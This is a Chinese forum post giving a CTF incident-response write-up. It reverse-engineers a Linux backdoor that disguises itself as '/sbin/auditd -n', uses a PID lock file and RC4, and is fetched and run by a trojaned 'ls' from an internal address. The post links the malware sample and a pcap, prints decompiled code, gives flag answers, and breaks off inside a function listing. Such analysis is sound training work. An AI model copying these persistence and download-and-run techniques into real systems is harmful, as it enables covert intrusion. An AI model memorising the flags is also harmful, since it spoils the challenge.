
# [CTF] 分享一个简单的应急响应综合场景题目分析过程

- 原帖: `https://www.52pojie.cn/forum.php?mod=viewthread&tid=2082959`
- 抓取时间: 2026-11-01T21:58:00

## 0. 恶意文件和流量包

下载链接：`https://wwasz.lanzoul.com/i6NvO3eqie2d`

包含恶意后门程序和 pcap 流量包（解压密码：`52pojie`）

## 1. 题干

某公司近期遭受疑似APT组织的针对性网络攻击。安全团队在发现异常后已立即启动应急响应流程，并成功截取了攻击周期内的完整网络流量数据。请你分析提供的流量包附件，追踪APT的攻击痕迹，并对服务器进行全面排查。所有溯源反制场景赛题均基于同一流量包展开。

- 请找出恶意程序对应的进程 `COMMAND`。并使用 `flag{commamd}` 的形式提交
- 攻击者留下的后门是以哪个文件作为标志文件，从而避免多个后门程序同时运行。请使用 `flag{文件绝对路径}` 的形式提交
- 攻击者在通过后门程序用到的对称加密算法是什么？攻击者通过后门程序建立了两次链接，这里两次链接用到的密钥分别是什么？请将答案以下划线 `_` 连接。示例：`flag{aes_first-aes-key111_second-aes-key22}`
- 根据威胁情报，攻击者以发送数据包的方式建立 `shell`，请问攻击者是通过哪两个数据包进行后门触发的？请给出 `wireshark` 中数据包的两个编号，以下划线 `_` 连接。实例：`flag{1234_5678}`
- 请找到恶意代码的下载地址，将其 `md5` 后进行提交
- 攻击者在建立 `shell` 之后读取了哪些文件？如果有多个文件，请按攻击者读取顺序拼接提交。示例：`flag{A文件绝对路径_B文件绝对路径_..._n文件绝对路径}`

## 2. 分析过程

这是一道应急响应综合场景题，题目给了一个 `ssh` 服务器和一个 pcap 流量包，`ssh` 服务器是遭受攻击的靶机，pcap 流量包包含了攻击过程中的流量。

### 2.1. 找到恶意程序

使用笨办法，将受害者服务器的文件全部打包下载到本地，然后用杀毒软件扫描。

![](https://attach.52pojie.cn/forum/202512/28/231813f6w1bf0tylls1cr0.png)

`1766935091540_d.png` (282.98 KB, 下载次数: 1)

[附件链接](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjgyMzU3N3wzMDFjOWU0NnwxNzkzNTcwMjc3fDE2ODA4NnwyMDgyOTU5&nothumb=yes)

2025-12-28 23:18 上传

得到恶意程序的路径为 `\usr\sbin\syslogd`。之后关键字搜索 `syslogd`，发现 `\usr\bin` 下的 `ls` 被替换成了脚本文件，当 `ls` 命令被执行时，会自动去该地址下载恶意程序并后台执行。则恶意代码的下载地址为：`http://192.168.24.12:38956/sys1ogd`

此时得到第五问答案：`flag{c7fefd269f67de72130f9aaa393a77b0}`

![](https://attach.52pojie.cn/forum/202512/28/231906t551zf0t47o1tt0m.png)

`1766935130910_d.png` (277.54 KB, 下载次数: 1)

[附件链接](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjgyMzU3OHw1YTU5NGRhMHwxNzkzNTcwMjc3fDE2ODA4NnwyMDgyOTU5&nothumb=yes)

2025-12-28 23:19 上传

### 2.2. 逆向分析过程

用 IDA 打开后门程序，可以发现出题人没有去除符号表，这对接下来的逆向分析带来了很大的便利。

![](https://attach.52pojie.cn/forum/202512/28/231930deedlpq154estoes.png)

`1766935169043_d.png` (132.55 KB, 下载次数: 1)

[附件链接](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjgyMzU3OXxiYmU5NTBiY3wxNzkzNTcwMjc3fDE2ODA4NnwyMDgyOTU5&nothumb=yes)

2025-12-28 23:19 上传

通过观察 `.text` 段的函数，看到了 `rc4`、`shell` 相关的函数名，可以大致猜测出这是一个 `shell` 后门程序，可能使用了 `RC4` 密码算法用于加密通信流量。

#### 2.2.1. `main` 函数

接下来直接分析反编译的 `main` 函数。

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int v4; // eax
  int v5; // eax
  char v6_socket[7]; // [rsp+26h] [rbp-1Ah] BYREF
  char v7_justforfun[11]; // [rsp+2Dh] [rbp-13h] BYREF
  unsigned __int64 v8; // [rsp+38h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  strcpy(v7_justforfun, "justforfun");
  strcpy(v6_socket, "socket");
  strcpy(&pid_path, "/var/run/haldrund.pid");
  if ( !access(&pid_path, 4) )
    exit(0);
  if ( getuid() )
    return 0;
  if ( argc == 1 )
  {
    if ( !(unsigned int)to_open(*argv, "kdmtmpflush") )
      _exit(0);
    _exit(-1);
  }
  memset(&cfg, 0, 0x220uLL);
  *((_DWORD *)&cfg + 136) = 0;
  v4 = time(0LL);
  srand(v4);
  strcpy(dest, "/sbin/auditd -n");
  strcpy(s1_justforfun, v7_justforfun);
  strcpy(s_socket, v6_socket);
  setup_time(*argv);
  set_proc_name(argc, (char **)argv, dest);
  if ( fork() )
    exit(0);
  init_signal();
  signal(17, sig_child);
  godpid = getpid();
  v5 = open(&pid_path, 65, 420LL);
  close(v5);
  signal(17, (__sighandler_t)((char *)&dword_0 + 1));
  setsid();
  packet_loop();
  return 0;
}
```

观察发现，这里将 2 个字符串（`justforfun` 和 `socket`）写入了全局变量（快捷键 `n` 可以自定义修改函数名、变量名等，便于分析），说明后续别的函数很可能会用到这两个神秘字符串，猜测可能跟某种验证机制有关。

![](https://attach.52pojie.cn/forum/202512/28/231958gyxxz4pcsp6jc3oo.png)

`1766935195884_d.png` (425 KB, 下载次数: 1)

[附件链接](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjgyMzU4MHw0ZWZlZGE2ZnwxNzkzNTcwMjc3fDE2ODA4NnwyMDgyOTU5&nothumb=yes)

2025-12-28 23:19 上传

37 行用于创建 `PID` 文件，但没有往其中写入内容，结合 12-14 行可以推断出其目的是用于防止重复运行的，当 `/var/run/haldrund.pid` 已经存在时，程序就会立即退出。

此时得到第二问答案：`flag{/var/run/haldrund.pid}`

![](https://attach.52pojie.cn/forum/202512/28/232025xzrxrxqmaqm0az0o.png)

`1766935221468_d.png` (419.26 KB, 下载次数: 1)

[附件链接](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjgyMzU4MXwzN2U4MTlhMnwxNzkzNTcwMjc3fDE2ODA4NnwyMDgyOTU5&nothumb=yes)

2025-12-28 23:20 上传

这里首先修改自己的进程名为 `/sbin/auditd -n`，随后 `fork()` 出一个子进程并让父进程直接退出，这样子进程的父进程就会变成 `init` 进程，程序通过这种方式将自己伪装成 Linux 系统的守护进程。在被攻击的服务器中执行 `ps -ef | grep /sbin` 发现后门程序已经伪装成系统守护进程在后台运行了。

此时得到第一问答案：`flag{/sbin/auditd -n}`

![](https://attach.52pojie.cn/forum/202512/28/232047hznczhzncsc94cz0.png)

`1766935243940_d.png` (164.57 KB, 下载次数: 1)

[附件链接](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjgyMzU4Mnw4ZjA1OGMxMnwxNzkzNTcwMjc3fDE2ODA4NnwyMDgyOTU5&nothumb=yes)

2025-12-28 23:20 上传

![](https://attach.52pojie.cn/forum/202512/28/232107r1squ7pugvl00j8u.png)

`1766935266450_d.png` (430.07 KB, 下载次数: 1)

[附件链接](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjgyMzU4M3w0YzRlZWI0ZHwxNzkzNTcwMjc3fDE2ODA4NnwyMDgyOTU5&nothumb=yes)

2025-12-28 23:21 上传

#### 2.2.2. `packet_loop` 函数

后门程序将一切准备好后，就会进入主循环 `packet_loop()` 函数。先贴出完整代码。

```c
unsigned __int64 packet_loop()
{
    uint16_t v0; // ax
    size_t v1; // rax
    unsigned int v2; // eax
    unsigned int v3; // eax
    char *v4; // rax
    uint16_t v5; // ax
    uint16_t v6; // ax
    uint16_t v7; // ax
    in_addr_t s_addr; // [rsp+4h] [rbp-38Ch]
    int fd; // [rsp+8h] [rbp-388h]
    int v11; // [rsp+14h] [rbp-37Ch]
    __pid_t pid; // [rsp+1Ch] [rbp-374h]
    int v13; // [rsp+20h] [rbp-370h]
    int v14; // [rsp+24h] [rbp-36Ch]
    _BYTE *v15; // [rsp+28h] [rbp-368h]
    _BYTE *v16; // [rsp+30h] [rbp-360h]
    __int16 optval; // [rsp+50h] [rbp-340h] BYREF
    __int16 *v18; // [rsp+58h] [rbp-338h]
    __int16 v19; // [rsp+60h] [rbp-330h] BYREF
    char v20; // [rsp+62h] [rbp-32Eh]
    char v21; // [rsp+63h] [rbp-32Dh]
    int v22; // [rsp+64h] [rbp-32Ch]
    __int16 v23; // [rsp+68h] [rbp-328h]
    char v24; // [rsp+6Ah] [rbp-326h]
    char v25; // [rsp+6Bh] [rbp-325h]
    int v26; // [rsp+6Ch] [rbp-324h]
    __int16 v27; // [rsp+70h] [rbp-320h]
    char v28; // [rsp+72h] [rbp-31Eh]
    char v29; // [rsp+73h] [rbp-31Dh]
    int v30; // [rsp+74h] [rbp-31Ch]
    __int16 v31; // [rsp+78h] [rbp-318h]
    char v32; // [rsp+7Ah] [rbp-316h]
    char v33; // [rsp+7Bh] [rbp-315h]
    int v34; // [rsp+7Ch] [rbp-314h]
    __int16 v35; // [rsp+80h] [rbp-310h]
    char v36; // [rsp+82h] [rbp-30Eh]
    char v37; // [rsp+83h] [rbp-30Dh]
    int v38; // [rsp+84h] [rbp-30Ch]
    __int16 v39; // [rsp+88h] [rbp-308h]
    char v40; // [rsp+8Ah] [rbp-306h]
    char v41; // [rsp+8Bh] [rbp-305h]
    int v42; // [rsp+8Ch] [rbp-304h]
    __int16 v43; // [rsp+90h] [rbp-300h]
    char v44; // [rsp+92h] [rbp-2FEh]
    char v45; // [rsp+93h] [rbp-2FDh]
    int v46; // [rsp+94h] [rbp-2FCh]
    __int16 v47; // [rsp+98h] [rbp-2F8h]
    char v48; // [rsp+9Ah] [rbp-2F6h]
    char v49; // [rsp+9Bh] [rbp-2F5h]
    int v50; // [rsp+9Ch] [rbp-2F4h]
    __int16 v51; // [rsp+A0h] [rbp-2F0h]
    char v52; // [rsp+A2h] [rbp-2EEh]
    char v53; // [rsp+A3h] [rbp-2EDh]
    int v54; // [rsp+A4h] [rbp-2ECh]
    __int16 v55; // [rsp+A8h] [rbp-2E8h]
    char v56; // [rsp+AAh] [rbp-2E6h]
    char v57; // [rsp+ABh] [rbp-2E5h]
    int v58; // [rsp+ACh] [rbp-2E4h]
    __int16 v59; // [rsp+B0h] [rbp-2E0h]
    char v60; // [rsp+B2h] [rbp-2DEh]
```
